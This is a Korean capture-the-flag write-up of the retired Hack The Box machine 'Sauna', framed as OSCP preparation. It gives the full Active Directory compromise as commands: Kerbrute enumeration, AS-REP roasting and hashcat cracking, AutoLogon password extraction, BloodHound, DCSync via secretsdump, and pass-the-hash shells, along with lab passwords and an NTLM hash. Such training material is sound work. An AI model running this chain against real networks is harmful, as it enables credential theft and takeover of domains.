# Sauna (HTB) - Write-up

**난이도** : Easy  
**참고** : https://0xdf.gitlab.io/2020/07/18/htb-sauna.html
**OS** : Windows Server 2019 / Windows 10 (Domain Controller)  
**Release Date** : 15 Feb 2020  
**Retire Date** : 18 Jul 2020  

**핵심 공격 경로**  
- Kerbrute → 유효 사용자 이름 열거  
- AS-REP Roasting → fsmith 계정 해시 획득 → 크랙 → WinRM 쉘  
- AutoLogon 레지스트리 → svc_loanmgr 평문 비밀번호 획득 → WinRM 쉘  
- BloodHound → svc_loanmgr의 DCSync 권한 확인  
- DCSync (secretsdump.py or Mimikatz) → Administrator NTLM 해시 덤프 → Admin/System 쉘  

> **OSCP 대비 핵심 포인트**  
> - AD 환경에서 사용자 이름 열거(Kerbrute) → AS-REP Roasting 조합은 매우 자주 나옴  
> - AutoLogon은 WinPEAS/레지스트리 열거 시 항상 확인해야 할 항목 중 하나  
> - BloodHound 없이도 DCSync 가능한 권한(GetChanges + GetChangesAll)은 AD 권한 상승의 대표 패턴  
> - secretsdump.py는 AV 우회 없이 DCSync 수행 가능 → OSCP에서 가장 선호되는 방법  

---

## 환경 정보 요약

- IP : `10.10.10.175` (당시 기준)  
- 열린 포트 : 53(DNS), 80(IIS), 88(Kerberos), 135(RPC), 139/445(SMB), 389/636(LDAP/LDAPS), 464(Kerberos PW), 593(RPC HTTP), 5985(WinRM), 3268/3269(Global Catalog), 고포트 RPC  
- 도메인 : `EGOTISTICAL-BANK.LOCAL`  
- 호스트명 : SAUNA  

**보충 설명**  
포트 패턴이 전형적인 Domain Controller. WinRM(5985)이 열려 있어 크리덴셜만 확보하면 쉘 획득이 매우 수월함. hosts 파일에 `10.10.10.175 sauna.htb egotistical-bank.local` 추가 추천.

---

## 1. Reconnaissance (정찰)

### 1-1. 전체 포트 스캔
```bash
nmap -p- --min-rate 10000 -oA nmap/all-tcp 10.10.10.175
````

**주요 열린 포트** 53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389 + 고포트 RPC

### 1-2. 스크립트 + 버전 스캔

Bash

```
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985 -sC -sV -oA nmap/scripts-version 10.10.10.175
```

**결과 요약**

- OS : Windows Server 2016/2019 추정
- Domain : EGOTISTICAL-BANK.LOCAL
- IIS 10.0 → Windows 10/2016/2019
- WinRM(5985) 열려 있음

**보충 설명** LDAP 스크립트가 도메인 이름을 바로 알려줌. OSCP에서 이런 정보는 hosts 파일에 바로 추가해서 후속 공격 준비.

---

## 2. Enumeration (열거)

### 2-1. Website (80/TCP)

- Egotistical Bank 정적 사이트
- About Us 페이지 → 팀 멤버 이름 (Fergus Smith, Harriet Smith 등)

**보충 설명** gobuster 결과는 별로 의미 없었지만, 팀 이름은 Kerbrute 사용자 이름 생성에 활용 가능.

### 2-2. SMB (445/TCP)

Bash

```
smbmap -H 10.10.10.175
smbclient -N -L //10.10.10.175
```

**결과** : 익명 접근 불가 **보충 설명** : DC에서는 거의 항상 익명 SMB 막혀 있음.

### 2-3. LDAP (389/TCP)

Bash

```
ldapsearch -x -h 10.10.10.175 -s base namingcontexts
ldapsearch -x -h 10.10.10.175 -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
```

**결과** : 도메인 확인 (EGOTISTICAL-BANK.LOCAL) **보충 설명** : Zone Transfer 실패 → 사용자 이름 열거로 넘어감.

### 2-4. Kerberos 사용자 이름 열거 (Kerbrute)

Bash

```
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  --dc 10.10.10.175
```

**발견된 유효 사용자**

- administrator
- hsmith
- fsmith
- sauna

**보충 설명** OSCP에서 Kerbrute는 사용자 이름 유출의 가장 빠르고 효과적인 방법 중 하나. 팀 페이지 이름 기반으로 fsmith → Fergus Smith 유추 가능.

---

## 3. Initial Foothold – AS-REP Roasting

### 3-1. AS-REP Roasting

Bash

```
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt \
  -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
```

**결과** : fsmith 계정 해시 획득 **보충 설명** DONT_REQ_PREAUTH 플래그가 설정된 계정만 대상. OSCP에서 가장 흔한 초기 진입 경로 중 하나.

### 3-2. Hash 크랙

Bash

```
hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
```

**결과** : Thestrokes23

### 3-3. WinRM 쉘

Bash

```
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```

**User flag**

PowerShell

```
type C:\Users\FSmith\Desktop\user.txt
```

**보충 설명** WinRM은 크리덴셜만 있으면 가장 편한 쉘. evil-winrm 설치 : gem install evil-winrm

---

## 4. Privilege Escalation – svc_loanmgr

### 4-1. WinPEAS 실행

SMB 공유 생성 → WinPEAS 업로드 → 실행

PowerShell

```
.\winPEAS.exe cmd fast > winpeas.txt
```

**주요 발견** AutoLogon 크리덴셜

- DefaultDomainName : EGOTISTICALBANK
- DefaultUserName : EGOTISTICALBANK\svc_loanmanager
- DefaultPassword : Moneymakestheworldgoround!

**레지스트리 직접 확인**

PowerShell

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Default*
```

**보충 설명** AutoLogon은 OSCP에서 자주 나오는 평문 비밀번호 저장 위치. WinPEAS가 자동으로 잡아줌.

### 4-2. svc_loanmgr 쉘

Bash

```
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

**보충 설명** svc_loanmgr (서비스 계정) → svc_loanmanager 오타 흔함. 정확한 이름은 net user로 확인.

---

## 5. Root – DCSync

### 5-1. BloodHound 데이터 수집

SharpHound.exe 실행 (SMB 공유로 출력):

PowerShell

```
.\SharpHound.exe --CollectionMethods All
```

ZIP 파일 exfil → BloodHound GUI 업로드

### 5-2. BloodHound 분석

svc_loanmgr → GetChanges + GetChangesAll 권한 → DCSync 가능

**보충 설명** GetChanges + GetChangesAll = DCSync 권한의 대표 조합. BloodHound Abuse Info 탭에 명령어 예시 있음.

### 5-3. DCSync 실행 (권장 – secretsdump.py)

Bash

```
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
```

**결과** Administrator NTLM : d9485863c1e9e05851aa40cbb4ab9dff

### 5-4. Admin 쉘 획득 (다양한 방법)

**Evil-WinRM**

Bash

```
evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff
```

**WMIExec (PTH)**

Bash

```
wmiexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff administrator@10.10.10.175
```

**PSExec (SYSTEM)**

Bash

```
psexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff administrator@10.10.10.175
```

**Root flag**

PowerShell

```
type C:\Users\Administrator\Desktop\root.txt
```

**보충 설명** DCSync은 135, 445, 고포트 RPC만 필요. secretsdump.py가 가장 안정적. Mimikatz는 AV에 걸릴 가능성 있음.

---

## Attack Chain 한 줄 요약

Kerbrute → AS-REP Roast (fsmith) → WinRM → WinPEAS → AutoLogon (svc_loanmgr) → WinRM → BloodHound → DCSync → Administrator NTLM → Root!

---

## OSCP 대비 추가 팁

- Kerbrute + GetNPUsers 조합은 AD 박스 초반 필수
- AutoLogon / LAPS / Unattended 설치 등 평문 저장 위치 항상 확인
- BloodHound 없이도 GetChangesAll → DCSync 패턴은 암기
- secretsdump.py는 AV 우회 + 네트워크만으로 DCSync 가능 → 최고의 선택지
- WinRM, WMI, PSExec 3가지 PTH 방법 모두 익히기